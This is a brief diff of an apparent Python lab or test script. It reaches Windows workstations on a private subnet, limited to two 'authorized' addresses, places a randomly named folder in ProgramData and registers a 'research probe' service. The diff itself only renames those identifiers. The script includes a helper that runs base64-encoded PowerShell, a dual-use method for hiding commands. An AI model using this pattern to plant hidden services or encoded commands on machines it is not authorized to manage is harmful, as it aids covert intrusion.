@@ -15,8 +15,8 @@ if suffix not in ('136', '137'):
     raise SystemExit('Only authorized workstation suffixes 136/137 are accepted')
 socket = sys.argv[2]
 host = f'agent@192.168.189.{suffix}'
-remote = 'C:\\ProgramData\\TelehackActivationProbe-' + uuid.uuid4().hex[:12]
-service = 'TelehackResearchProbe'
+remote = 'C:\\ProgramData\\MandatnikActivationProbe-' + uuid.uuid4().hex[:12]
+service = 'MandatnikResearchProbe'
 
 def ps(script):
     encoded = base64.b64encode(("$ErrorActionPreference='Stop';$ProgressPreference='SilentlyContinue';" + script).encode('utf-16le')).decode()
